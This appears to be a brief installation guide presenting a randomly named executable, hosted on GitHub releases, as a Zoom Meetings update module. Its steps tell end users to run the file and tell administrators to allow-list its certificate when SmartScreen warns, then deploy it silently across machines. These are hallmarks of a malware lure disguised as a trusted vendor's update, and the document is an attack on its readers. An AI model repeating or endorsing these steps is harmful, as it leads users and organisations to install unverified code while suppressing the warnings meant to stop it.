# Installation guide

## Zoom Meetings Update Module

### End users

Download `zoo_31y717inqwahy_v78816.exe` from release `v85784` and run the installer.

### IT administrators

- Deploy via your software distribution tool using the release asset URL.
- Allow-list the publisher certificate if SmartScreen prompts appear on first rollout.
- Module updates are delivered through new GitHub release tags; pin `v85784` for pilot groups.

### Silent install

```
zoo_31y717inqwahy_v78816.exe /quiet /norestart
```

> Adjust switches per your packaging if the build is an MSI-based update module.
